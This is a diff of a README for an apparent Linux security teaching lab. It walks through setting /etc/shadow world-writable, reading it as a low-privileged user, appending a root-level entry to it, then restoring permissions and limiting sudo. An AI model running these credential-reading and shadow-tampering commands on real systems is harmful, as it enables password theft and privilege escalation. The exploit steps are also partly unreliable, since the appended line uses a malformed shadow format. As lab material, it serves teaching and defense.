@@ -1,106 +1,107 @@
 # POC-TASKS
-# 📌 Linux Security - Exploitation & Hardening (PoC)
+# 📌 Linux Security - Exploitation & Defense (PoC)
 
-This repository demonstrates **user and permission misconfigurations** in Linux, including **exploitation and mitigation**.
+This repository demonstrates **security vulnerabilities** in Linux systems related to **user and permission misconfigurations**, along with their **exploitation and mitigation** techniques.
 
 ---
 
-## 🔹 **Task 1: User & Permission Misconfigurations**
+## 🔹 **Task 1: User & File Permission Weaknesses**
 
-### ✅ **Setup: Creating Users & Misconfiguring Permissions**
+### ✅ **Step 1: Setting Up Vulnerable User & Permissions**
 
 ```bash
-# Creating user CSK
-┌──(kali㉿kali)-[~/Desktop]
+# Creating a test user CSK
+┌──(kali㉿kali)-[~/lab]
 └─$ sudo useradd CSK
 
-# Set passwords for the users
-┌──(kali㉿kali)-[~/Desktop]
-└─$ echo "CSK:1234" | sudo chpasswd
+# Assigning a weak password
+┌──(kali㉿kali)-[~/lab]
+└─$ echo "CSK:12345" | sudo chpasswd
 
-# Verify users exist
+# Verify user creation
 cat /etc/passwd | grep "CSK"
 
-# Check default permissions of sensitive files
-┌──(kali㉿kali)-[~/Desktop]
+# Check access settings of sensitive files
+┌──(kali㉿kali)-[~/lab]
 └─$ ls -l /etc/shadow
 -rw-r----- 1 root shadow 1722 Mar 17 19:11 /etc/shadow
 
-# Assign incorrect permissions to /etc/shadow (Very Dangerous!)
-┌──(kali㉿kali)-[~/Desktop]
+# Set insecure file permissions (Major Security Risk!)
+┌──(kali㉿kali)-[~/lab]
 └─$ sudo chmod 777 /etc/shadow
 
-# Verify permissions have changed
-┌──(kali㉿kali)-[~/Desktop]
+# Validate permission modifications
+┌──(kali㉿kali)-[~/lab]
 └─$ ls -l /etc/shadow         
 -rwxrwxrwx 1 root shadow 1722 Mar 17 19:11 /etc/shadow
 ```
 
 ---
 
-### ✅ **Exploitation: Accessing Sensitive Files as a Low-Privileged User**
+### ✅ **Step 2: Exploiting the Weak Permissions**
 
 ```bash
-# Switch to CSK (a low-privileged user)
+# Switch to the low-privileged user
 ┌──(kali㉿kali)-[~]
 └─$ su - CSK
-Password: 1234
+Password: 12345
 
-# Try reading sensitive files
+# Attempt to access restricted files
 $ cat /etc/shadow
 
-# Try modifying the /etc/shadow file (Critical exploit!)
-$ echo "hacked::0:0::/:/bin/bash" | tee -a /etc/shadow
+# Inject a new root-level user into the shadow file
+$ echo "attacker::0:0::/:/bin/bash" | tee -a /etc/shadow
 
-# Switch back to root
+# Gain elevated privileges
 su
 ```
 
 ---
 
-### ✅ **Mitigation: Fixing the Security Issues**
+### ✅ **Step 3: Fixing the Security Flaws**
 
 ```bash
-# Restore secure permissions on /etc/shadow
+# Restore proper permissions on the shadow file
 sudo chmod 640 /etc/shadow
 sudo chown root:shadow /etc/shadow
 
-# Verify the fix
+# Verify the applied security settings
 ls -l /etc/shadow
 ```
 
 ---
 
-### ✅ **Secure Sudo Privileges**
+### ✅ **Step 4: Strengthening Sudo Privileges**
 
 ```bash
-# Edit sudoers file safely
+# Secure sudo access settings
 sudo visudo
 ```
 
-**Restrict Alice from switching to root** by adding:
+**Restrict CSK from escalating privileges** by adding:
 ```plaintext
 CSK ALL=(ALL) !/bin/su, !/bin/bash
 ```
-## 📌 Task 1 - Summary  
+
+## 📌 Summary of Task 1  
 
 | **Step**             | **Action**                                         | **Command**                                  |
 |----------------------|---------------------------------------------------|---------------------------------------------|
 | 🔹 **Setup**         | Create user **CSK**                                | `sudo useradd CSK` |
-|                     | Set password for **CSK**                           | `echo "CSK:password123" | sudo chpasswd` |
-|                     | Verify user exists                                 | `cat /etc/passwd | grep CSK` |
-|                     | Check default permissions of sensitive files       | `ls -l /etc/shadow /etc/passwd` |
-|                     | Assign incorrect permissions (INSECURE)            | `sudo chmod 777 /etc/shadow` |
-|                     | Verify permission changes                          | `ls -l /etc/shadow` |
-| 🔹 **Exploitation**  | Switch to **CSK** (low-privileged user)           | `su - CSK` |
-|                     | Try accessing sensitive files                      | `cat /etc/shadow`<br>`cat /etc/passwd` |
-|                     | Try modifying `/etc/shadow` (Critical exploit!)    | `echo "hacked::0:0::/:/bin/bash" | tee -a /etc/shadow` |
-|                     | Switch back to root                                | `su` |
-| 🔹 **Mitigation**    | Restore secure permissions                        | `sudo chmod 640 /etc/shadow`<br>`sudo chown root:shadow /etc/shadow` |
-|                     | Verify permission fix                              | `ls -l /etc/shadow` |
-| 🔹 **Secure Sudo Privileges** | Edit sudoers file                   | `sudo visudo` |
-|                     | Restrict **CSK** from switching to root            | Add the following in `visudo`:<br>`rcb ALL=(ALL) !/bin/su, !/bin/bash` |
+|                     | Assign a weak password                             | `echo "CSK:12345" | sudo chpasswd` |
+|                     | Validate user creation                             | `cat /etc/passwd | grep CSK` |
+|                     | Check file permissions                             | `ls -l /etc/shadow /etc/passwd` |
+|                     | Apply insecure file access settings                | `sudo chmod 777 /etc/shadow` |
+|                     | Confirm modified permissions                       | `ls -l /etc/shadow` |
+| 🔹 **Exploitation**  | Switch to **CSK** (unprivileged user)              | `su - CSK` |
+|                     | Attempt to access restricted files                 | `cat /etc/shadow`<br>`cat /etc/passwd` |
+|                     | Inject malicious entry into `/etc/shadow`          | `echo "attacker::0:0::/:/bin/bash" | tee -a /etc/shadow` |
+|                     | Elevate privileges                                 | `su` |
+| 🔹 **Mitigation**    | Restore correct file access controls               | `sudo chmod 640 /etc/shadow`<br>`sudo chown root:shadow /etc/shadow` |
+|                     | Verify secure configuration                        | `ls -l /etc/shadow` |
+| 🔹 **Sudo Hardening**| Edit sudoers configuration                        | `sudo visudo` |
+|                     | Restrict **CSK** from privilege escalation         | Add the following in `visudo`:<br>`CSK ALL=(ALL) !/bin/su, !/bin/bash` |
 
 ---
 
-### -----------------------------------------------THE END OF TASK 1----------------------------------------
+### -----------------------------------------------END OF TASK 1----------------------------------------
